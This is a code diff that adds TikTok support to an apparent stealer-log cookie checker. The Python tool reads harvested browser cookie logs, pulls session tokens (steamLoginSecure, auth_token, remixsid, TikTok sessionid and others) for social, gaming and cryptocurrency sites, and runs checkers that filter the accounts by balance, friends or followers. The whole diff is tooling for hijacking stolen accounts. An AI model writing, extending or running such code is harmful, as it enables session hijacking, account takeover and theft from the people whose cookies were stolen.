@@ -18,6 +18,7 @@ from roblox import *
 from steam import *
 from twitter import *
 from vk import *
+from tiktok import *
 class StandartMetod(object):
     @staticmethod
     def validate(nick):
@@ -168,7 +169,7 @@ class connetcion_database(object):
             return cursor.fetchone()
 
 class headless(object):
-    services = ['Crex24', 'FreeBitco', 'HumbleBundle', 'Instagram', 'Kryptex', 'Mail', 'PornoHub', 'Roblox', 'Steam', 'Twitter', 'Vk']
+    services = ['Crex24', 'FreeBitco', 'HumbleBundle', 'Instagram', 'Kryptex', 'Mail', 'PornoHub', 'Roblox', 'Steam', 'Twitter', 'Vk', 'TikTok']
     settings_services = {
         'Crex24': {'domain': ['crex24.com', '.crex24.com','www.crex24.com'], 'name': ['connect.sid']},
         'FreeBitco': {'domain': ['freebitco.in', '.freebitco.in','www.freebitco.in'], 'name': ['fbtc_session','fbtc_userid']},
@@ -181,6 +182,7 @@ class headless(object):
         'Steam': {'domain': ['store.steampowered.com', '.steampowered.com', 'help.steampowered.com', 'steampowered.com', '.steamcommunity.com', 'steamcommunity.com'], 'name': ['steamLoginSecure']},
         'Twitter': {'domain': ['.twitter.com', 'twitter.com'], 'name': ['auth_token']},
         'Vk': {'domain': ['.vk.com','vk.com'], 'name': ['remixnsid', 'remixsid']},
+        'TikTok': {'domain': ['.www.tiktok.com', '.tiktok.com', 'tiktok.com'], 'name': ['sessionid']}
     }
 
 
@@ -220,7 +222,8 @@ class headless(object):
                         'Roblox': 1,
                         'Steam': 1,
                         'Twitter': 1,
-                        'Vk': 1
+                        'Vk': 1,
+                        'TikTok': 1,
                     },
                     'Filter_settings': {
                         'Crex24': {
@@ -275,6 +278,11 @@ class headless(object):
                             'Filter_balanc': '10',
                             'Friends_path': '!Friends',
                             'Filter_friends': '50'
+                        },
+                        'TikTok': {
+                            'Full_log': '!Full_log',
+                            'Followers_path': '!Followers',
+                            'Filter_followers': '200'
                         }
                     }
                     }
@@ -317,11 +325,11 @@ class start_work():
     @staticmethod
     def get_full_cookie(path):
         roblox_cookie, twitter_cookie, humbleBundle_cookie, instagram_cookie, kryptex_cookie, mail_cookie, pornohub_cookie = [], [], [], [], [], [], []
-        steam_cookie, vk_cookie, crex24_cookie, freebitco_cookie = [], [], [], []
+        steam_cookie, vk_cookie, crex24_cookie, freebitco_cookie, tiktok_cookie = [], [], [], [], []
         with open(path,'r', encoding='utf-8') as file:
             src = file.readlines()
         local_roblox, local_twitter, local_humbleBundle, local_instagram, local_kryptex, local_mail, local_pornohub = {}, {}, {}, {}, {}, {}, {}
-        local_steam, local_vk, local_crex24, local_freebitco = {}, {}, {}, {}
+        local_steam, local_vk, local_crex24, local_freebitco, local_tiktok = {}, {}, {}, {}, {}
         for line in src:
             local_line = line.strip().split('\t')
             if start_work.allow_services['Roblox']:
@@ -411,7 +419,15 @@ class start_work():
             if len(local_freebitco) == len(start_work.settings_services['FreeBitco']['name']):
                 freebitco_cookie.append(local_freebitco)
                 local_freebitco = {}
-        return roblox_cookie, twitter_cookie, humbleBundle_cookie, instagram_cookie, kryptex_cookie, mail_cookie, pornohub_cookie, steam_cookie, vk_cookie, crex24_cookie, freebitco_cookie
+
+            if start_work.allow_services['TikTok']:
+                if local_line[0] in start_work.settings_services['TikTok']['domain']:
+                    if local_line[-2] in start_work.settings_services['TikTok']['name']:
+                        local_tiktok[local_line[-2]] = local_line[-1]
+            if len(local_tiktok) == len(start_work.settings_services['TikTok']['name']):
+                tiktok_cookie.append(local_tiktok)
+                local_tiktok = {}
+        return roblox_cookie, twitter_cookie, humbleBundle_cookie, instagram_cookie, kryptex_cookie, mail_cookie, pornohub_cookie, steam_cookie, vk_cookie, crex24_cookie, freebitco_cookie, tiktok_cookie
     @classmethod
     def start(cls):
         changer_log = True
@@ -421,7 +437,7 @@ class start_work():
             if value:
                 stop += 1
         roblox_cookie, twitter_cookie, humbleBundle_cookie, instagram_cookie, kryptex_cookie, mail_cookie, pornohub_cookie = {}, {}, {}, {}, {}, {}, {}
-        steam_cookie, vk_cookie, crex24_cookie, freebitco_cookie = {}, {}, {}, {}
+        steam_cookie, vk_cookie, crex24_cookie, freebitco_cookie, tiktok_cookie = {}, {}, {}, {}, {}
         while True:
             if changer_log:
                 if cls.full_logi:
@@ -430,7 +446,7 @@ class start_work():
                         cls.full_logi.remove(log)
                         changer_log = False
                     roblox_cookie, twitter_cookie, humbleBundle_cookie, instagram_cookie, kryptex_cookie, mail_cookie\
-                    , pornohub_cookie, steam_cookie, vk_cookie, crex24_cookie, freebitco_cookie = start_work.get_full_cookie(path=cls.settings['File_scan']+"\\"+log)
+                    , pornohub_cookie, steam_cookie, vk_cookie, crex24_cookie, freebitco_cookie, tiktok_cookie = start_work.get_full_cookie(path=cls.settings['File_scan']+"\\"+log)
                 else:
                     break
 
@@ -521,6 +537,14 @@ class start_work():
                     freebitco_cookie.remove(freebitco_cook)
                     freebitco_checker.checker('FreeBitco', freebitco_cook, log, cls.settings['File_scan'])
                 if len(freebitco_cookie) == 0:
+                    counter_stop += 1
+
+            if cls.allow_services['TikTok']:
+                if tiktok_cookie:
+                    tiktok_cook = random.choice(tiktok_cookie)
+                    tiktok_cookie.remove(tiktok_cook)
+                    tiktok_checker.checker('TikTok', tiktok_cook, log, cls.settings['File_scan'])
+                if len(tiktok_cookie) == 0:
                     counter_stop += 1
 
             if counter_stop >= stop:
